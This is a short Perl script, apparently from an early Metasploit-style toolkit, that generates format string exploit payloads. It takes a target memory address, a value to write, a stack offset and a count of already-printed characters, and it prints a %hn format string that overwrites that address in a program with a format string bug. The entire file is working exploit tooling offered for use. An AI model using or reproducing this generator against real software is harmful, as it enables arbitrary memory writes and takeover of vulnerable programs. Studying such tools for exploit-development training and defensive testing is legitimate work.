#!/usr/bin/perl
use strict;
use lib 'lib';
use Pex::Utils;

die(qq{
Format String Overwrite Generator

Currently only supports %hn

usage:   where what [ options ]
example: 0x12345678 0x41414141 offset 4 before 2

options:
  offset - offset to controlled location (in dwords on x86, etc)
  before - number of characters printed before our part of controlled fmt
  pack   - endianess, currently supported V for little and N for big
           defaults to V (little)

}) if(@ARGV < 2);

my $where = hex(shift);
my $what = hex(shift);
my $fmt = Pex::Utils::FormatOverwrite('where', $where, 'what', $what, @ARGV);

print STDERR sprintf("\n where: 0x%08x\n  what: 0x%08x\n   fmt: %s\n\n",
  $where, $what, $fmt);

print $fmt;
